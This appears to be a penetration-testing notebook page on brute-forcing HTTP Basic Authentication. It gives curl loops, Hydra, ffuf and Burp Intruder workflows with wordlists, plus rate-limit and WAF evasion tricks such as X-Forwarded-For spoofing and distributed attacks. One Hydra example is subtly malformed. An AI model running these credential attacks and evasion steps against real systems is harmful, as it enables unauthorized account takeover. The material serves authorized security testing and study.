#webapplications

HTTP Basic Authentication sends credentials as a Base64-encoded header on every request. While simple, it's vulnerable to credential attacks if the endpoint doesn't enforce rate limiting.

---

## HTTP Basic Authentication Basics

### How it works
```
Authorization: Basic base64(username:password)
```

**Example:**
```
GET /admin HTTP/1.1
Host: target.com
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

The string `YWRtaW46cGFzc3dvcmQxMjM=` decodes to `admin:password123`.

### Identify Basic Auth endpoints
```bash
# Look for 401 Unauthorized responses
curl -v http://target.com/admin
# Response: WWW-Authenticate: Basic realm="Admin Panel"
```

---

## Brute Forcing with curl

### Single attempt
```bash
curl -u admin:password123 http://target.com/admin
```

**Response on success:** 200 OK (returns page content)
**Response on failure:** 401 Unauthorized (returns "Invalid credentials")

### Basic loop (slow)
```bash
for pass in password admin 123456 password123; do
  response=$(curl -s -u admin:"$pass" http://target.com/admin)
  if [[ ! "$response" =~ "401\|Unauthorized" ]]; then
    echo "[+] Found: admin:$pass"
    break
  fi
done
```

---

## Brute Forcing with Hydra

### Basic auth attack
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt basic://target.com/admin
```

**Flags:**
- `-l admin` — username (single)
- `-L users.txt` — usernames (list)
- `-P rockyou.txt` — password wordlist
- `basic://target.com/path` — target endpoint
- `-t 4` — 4 parallel threads
- `-w 5` — 5 second delay between attempts

### Against rate limiting (slower)
```bash
hydra -l admin -P rockyou.txt -t 1 -w 10 basic://target.com/admin
# -t 1 = single thread, -w 10 = 10 second wait
```

### Test multiple users
```bash
hydra -L users.txt -P passwords.txt basic://target.com/admin
```

---

## Brute Forcing with ffuf

### Basic auth fuzzing
```bash
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u "http://target.com/admin" \
  -H "Authorization: Basic ##USER##:##PASS##@base64" \
  -fc 401
```

**Better approach (pre-encode):**
```bash
# Create a list of base64-encoded credentials
for user in admin root test; do
  for pass in password 123456 admin; do
    echo "Basic $(echo -n "$user:$pass" | base64)" >> auth.txt
  done
done

# Fuzz with the list
ffuf -w auth.txt \
  -u "http://target.com/admin" \
  -H "Authorization: ##WORDLIST##" \
  -fc 401 -fw 100
```

---

## Brute Forcing with Burp Intruder

### Detailed Workflow (RFC 7617 Compliant)

**Step 1: Capture the request**
```
GET /admin HTTP/1.1
Host: target.com
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

Right-click and send to Intruder.

**Step 2: Decode and position the payload**
1. Go to Positions tab
2. Decode the base64 string in Authorization header: `admin:password123`
3. Highlight the decoded string
4. Click "Add §" button to set payload position around the credentials

Your header should look like:
```
Authorization: Basic §admin:password123§
```

**Step 3: Configure Payloads**
1. Go to Payloads tab
2. Set payload type: **Simple list**
3. Load wordlist: `/usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt`

**Step 4: Add Payload Processing Rules**
Payload processing automatically transforms each payload before sending:

1. **Rule 1: Prepend username**
   - Type: Add prefix
   - Value: `admin:` (replace "admin" with target username)
   - This converts `password123` → `admin:password123`

2. **Rule 2: Base64 encode**
   - Type: Encode
   - Encoding: Base64

3. **Rule 3: Remove padding (optional)**
   - Type: Find and replace
   - Find: `=`
   - Replace: (leave blank)
   - **Note:** Some systems keep padding; test both approaches

**Step 5: Configure Encoding**
In the Payload encoding section at bottom:
- Remove the `=` character from URL encoding list (since we're base64 encoding)
- Leave other special characters as-is

**Step 6: Run the attack**
1. Click "Start Attack"
2. Attack takes ~1-2 minutes for 500 passwords
3. **Look for HTTP 200 status code** (success) vs 401 (failure)

**Step 7: Decode successful credentials**
When you find a 200 response:
1. Copy the Authorization header value
2. Decode from base64:
   ```bash
   echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
   # Output: admin:password123
   ```
3. Use the decoded credentials to log in

### Quick Intruder Setup (Visual Reference)
```
Positions tab:
  Authorization: Basic §PAYLOAD§

Payloads tab:
  Type: Simple list
  Wordlist: 500-worst-passwords.txt

Payload processing:
  Rule 1: Add prefix "admin:"
  Rule 2: Encode (Base64)

Attack:
  Success = HTTP 200
  Failure = HTTP 401
```

### Manual Repeater approach
```
GET /admin HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

1. Manually change credentials in Authorization header
2. Send request
3. Look for 200 OK (success) vs 401 Unauthorized (failure)

---

## Base64 Encoding Credentials

### Encode in bash
```bash
echo -n "admin:password123" | base64
# Output: YWRtaW46cGFzc3dvcmQxMjM=
```

### Decode in bash
```bash
echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
# Output: admin:password123
```

### Pre-generate credential list
```bash
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    cred="$user:$pass"
    encoded=$(echo -n "$cred" | base64)
    echo "Basic $encoded"
  done
done > credentials.txt
```

---

## Detection Methods

### Check response codes
```bash
# Success: 200 OK
# Failure: 401 Unauthorized
# Rate limit: 429 Too Many Requests, 403 Forbidden
```

### Check response content
```bash
# Successful auth returns page content
# Failed auth returns: "Authorization Required" or similar

curl -s -u admin:wrongpass http://target.com/admin | grep -i "authorization\|unauthorized"
```

### Timing attacks
Some systems process valid credentials slower (check password hash) than invalid ones. **Valid credentials may take longer.**

---

## Rate Limiting & WAF Bypass

### Detect rate limiting
```bash
# Send 50 requests quickly
for i in {1..50}; do
  curl -s -u admin:pass$i http://target.com/admin -w "%{http_code}\n"
done | sort | uniq -c

# Look for sudden drops to 429 or 403
```

### Bypass techniques

| Technique | Implementation |
| --- | --- |
| **Slow down** | Hydra: `-w 10` (10s delay) |
| **Different endpoints** | If `/admin` rate-limited, try `/api/admin`, `/admin.php` |
| **X-Forwarded-For header** | `curl -H "X-Forwarded-For: 1.2.3.4" ...` (fake IP) |
| **User-Agent rotation** | Change User-Agent per request |
| **Session variation** | Use different Cookie per request |
| **Distributed attack** | Run from multiple IPs simultaneously |
| **Off-peak timing** | Brute force at night |

### Hydra with evasion
```bash
hydra -l admin -P rockyou.txt \
  -t 1 \        # 1 thread
  -w 15 \       # 15s between attempts
  -H "X-Forwarded-For: random" \
  basic://target.com/admin
```

---

## Common Vulnerabilities

| Flaw | Impact |
| --- | --- |
| **No rate limiting** | Unlimited brute force attempts |
| **Default credentials** | Easy bypass with known defaults |
| **Weak password policy** | Users choose common passwords |
| **No account lockout** | Infinite retries allowed |
| **Basic auth over HTTP** | Credentials visible in traffic (use HTTPS test only) |
| **Basic auth in URL** | `http://admin:password@target.com` — logs the credential |

---

## Complete Attack Workflow

### Step 1: Identify Basic Auth
```bash
curl -v http://target.com/admin
# Look for: HTTP/1.1 401 Unauthorized
# Header: WWW-Authenticate: Basic realm="..."
```

### Step 2: Test common credentials
```bash
for cred in "admin:admin" "admin:password" "root:root"; do
  user=$(echo "$cred" | cut -d: -f1)
  pass=$(echo "$cred" | cut -d: -f2)
  curl -s -u "$user:$pass" http://target.com/admin | grep -q "dashboard" && echo "[+] Found: $cred"
done
```

### Step 3: Brute force with Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 basic://target.com/admin
```

### Step 4: Verify credentials
```bash
curl -u admin:foundpassword http://target.com/admin -v
# Should see: HTTP/1.1 200 OK
```

---

## Tools needed

- **curl** — manual testing
- **Hydra** — parallel brute forcing
- **ffuf** — flexible fuzzing
- **Burp Suite** — interactive Intruder module
- **base64** — encode/decode credentials
- **Wordlists** — rockyou.txt, custom lists

---

**See also:**
- [[Web Login Brute Force]] — form-based login brute forcing
- [[Session & Cookie Security]] — authentication weaknesses
- [[HTTP Requests]] — request anatomy and headers
